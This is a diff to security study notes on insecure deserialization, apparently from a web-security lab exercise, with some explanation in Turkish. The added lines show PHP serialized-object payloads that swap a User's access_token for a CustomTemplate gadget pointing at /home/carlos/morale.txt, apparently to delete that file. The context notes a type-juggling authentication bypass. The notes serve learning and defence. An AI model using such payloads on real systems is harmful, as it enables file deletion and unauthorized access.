@@ -57,6 +57,14 @@
  // attacker modified the password attribute so that it contained the integer 0 instead of the expected string. As long as the stored password does not start with a number, the condition would always return true, enabling an authentication bypass
  }
  ```
+
+* User class'ının access_token attribute'unun CustomTemplate class'ı olarak set edilmesi (Type Casting hatası olsa bile obje çoktan create edilmiş oluyor.): 
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hrrjw29gehwnau6rlbmb5natdyiarnns";}
+```
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";O:14:"CustomTemplate":2:{s:18:"template_file_path";s:23:"/home/carlos/morale.txt";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";};}
+ ```
  #### JAVA
  * Java uses binary serialization format.
  * Serialized Java objects always begin with the same bytes, which are encoded as <b>ac ed</b> in hexadecimal and <b>rO0</b> in Base64
